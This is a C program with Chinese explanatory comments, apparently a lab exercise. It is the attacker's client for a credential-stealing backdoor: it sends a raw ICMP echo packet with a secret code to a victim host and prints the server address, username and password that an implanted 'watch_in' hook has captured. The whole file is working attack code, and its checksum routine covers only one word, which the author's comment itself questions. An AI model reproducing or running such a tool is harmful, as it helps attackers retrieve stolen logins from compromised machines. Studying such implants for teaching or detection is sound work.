
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#ifndef __USE_BSD
# define __USE_BSD             /* We want the proper headers */
#endif

static unsigned short checksum(int numwords, unsigned short *buff)
{
   unsigned long sum;

   for(sum = 0;numwords > 0;numwords--)
     sum += *buff++;   /* add next word, then increment pointer */

   sum = (sum >> 16) + (sum & 0xFFFF);
   sum += (sum >> 16);

   return ~sum;
}

int main(int argc, char *argv[])
{
	/*攻击者需要构造ICMP包，给其分配一定的空间*/
    unsigned char dgram[256];          /* Plenty for a PING datagram */
    /* 接收受害者传过来的回复ICMP包的buff(含用户名和密码)*/ 
    unsigned char recvbuff[256]; 
    /* iphead指向ip头部 */ 
    struct ip *iphead = (struct ip *)dgram;
    /* icmphead指向icmp头部 +sizeof(ip)是跳过ip头部 */
    struct icmp *icmphead = (struct icmp *)(dgram + sizeof(struct ip));
    /* 源地址：不仅有攻击者的IP地址 */
    struct sockaddr_in src;
    /* 目的地址：包含受害者的IP；这里IP地址需要接收命令行输入的第一个参数*/
    struct sockaddr_in addr;
    /* in_addr是sockaddr_in中的一部分，其中仅含IP地址变量；sockaddr_in*/
    struct in_addr my_addr;  //仅是攻击者IP地址；这里需要接收命令行输入的第二个参数
    /* 仅含受害者访问的邮箱服务器的地址*/
    struct in_addr serv_addr;
    /* 源地址的大小 */
    socklen_t src_addr_size = sizeof(struct sockaddr_in);
    
    int icmp_sock = 0;  //socket文件描述符
    /* 缓冲区 */
    int one = 1;
    /* 缓冲区的头部指针 */
    int *ptr_one = &one;
    /* 若没有传入两个参数则直接退出 */
    if (argc < 3) {
    fprintf(stderr, "Usage:  %s remoteIP myIP\n", argv[0]);
    exit(1);
    }

    /* 获取一个socket，协议簇用的是ipv4，AF_INET和PF_INET是一样的, SOCK_RAW表示我们自己来构建这个数据包，类型为ICMP数据包 */
    /* 该情况下，仅对数据包的数据部分作修改，不需要修改IP地址，所以可以直接发一个普通的socket*/
	if ((icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
    	fprintf(stderr, "Couldn't open raw socket! %s\n",
        strerror(errno));
    	exit(1);
    }

    /* set the HDR_INCL option on the socket设置sock选项，使用ip协议来解析，IP_HDRINCL表示我们自己来填充数据 */
    if(setsockopt(icmp_sock, IPPROTO_IP, IP_HDRINCL, ptr_one, sizeof(one)) < 0) {
    	close(icmp_sock);
    	fprintf(stderr, "Couldn't set HDRINCL option! %s\n",
        strerror(errno));
    	exit(1);
    }
	/*这里开始构造ICMP包*/
	/* 将目的地址的协议簇设置为ipv4*/
    addr.sin_family = AF_INET;
    /*运行时输入第一个参数为受害者的IP*/ 
    addr.sin_addr.s_addr = inet_addr(argv[1]);
	/*运行时输入第二个参数为攻击者的IP*/ 
    my_addr.s_addr = inet_addr(argv[2]);
	/*将ptr指向的内存块的第一个num字节设置为指定值*/
	/*将dgram初始化为全0*/ 
    memset(dgram, 0x00, 256);
    /*将recvbuff初始化为全0*/ 
    memset(recvbuff, 0x00, 256);

    /* 为ip头部填充数据 */
    iphead->ip_hl  = 5;   //4位 ip首部长度 
    iphead->ip_v   = 4;  //协议：IPV4
    iphead->ip_tos = 0;   //8位 服务类型 
    iphead->ip_len = 64;    //   IP包总长度>=64:20字节IP头+8字节的ICMP头+36字节数据；这样才不会被watch_in函数中的判断过滤掉
    iphead->ip_id  = (unsigned short)rand(); //16位 可以初始化为0 
    iphead->ip_off = 0; //13位 分段偏移 
    iphead->ip_ttl = 128; //8位 生存时间 
    iphead->ip_p   = IPPROTO_ICMP; //8位 icmp协议 
    iphead->ip_sum = 0; //校验和初始化为0 
    iphead->ip_src = my_addr; //源地址：攻击者的IP，即本机IP
    iphead->ip_dst = addr.sin_addr; //目的地址：受害者的IP

    /* 为icmp头部填充数据 */
    icmphead->icmp_type = ICMP_ECHO; //类型为icmp请求报文，类型为8；需要受害者回复ICMP_REPLY包，类型为0； 
    icmphead->icmp_code = 0x5B; //暗号：watch_in()中判断的icmp_code一致 
    icmphead->icmp_cksum = checksum(1, (unsigned short *)icmphead);//42->44：8+36；icmp的校验和需要计算头部和数据部分 8字节的首部 和 36字节的数据不问？？？ 

    /* 将我们构造好的包发出去 */
    fprintf(stdout, "Sending request...\n");
    if (sendto(icmp_sock, dgram, 64, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0) {
    	fprintf(stderr, "\nFailed sending request! %s\n",
        strerror(errno));
    	return 0;
    }

    fprintf(stdout, "Waiting for reply...\n");
    if (recvfrom(icmp_sock, recvbuff, 256, 0, (struct sockaddr *)&src, &src_addr_size) < 0) {
    	fprintf(stdout, "Failed getting reply packet! %s\n",
        strerror(errno));
    	close(icmp_sock);
    	exit(1);
    }

    iphead = (struct ip *)recvbuff;
    icmphead = (struct icmp *)(recvbuff + sizeof(struct ip));
    // 将获取到的包的数据部分中的服务器的IP地址(占4字节，即in_addr结构体大小)复制到serv_addr 
    memcpy(&serv_addr, ((char *)icmphead + 8), sizeof (struct in_addr));  //ICMP头为8字节

    /*inet_ntoa函数负责将网络地址转换成.间隔的字符串格式*/
    fprintf(stdout, "Stolen for htttp server %s:\n", inet_ntoa(serv_addr));
    fprintf(stdout, "Username:    %s\n", (char *)((char *)icmphead + 12));  //12 = 8(ICMP头部)+4(IP地址长度)
    fprintf(stdout, "Password:    %s\n", (char *)((char *)icmphead + 28));   //28 = 12 + 16(用户名的长度)

    close(icmp_sock);

    return 0;
}
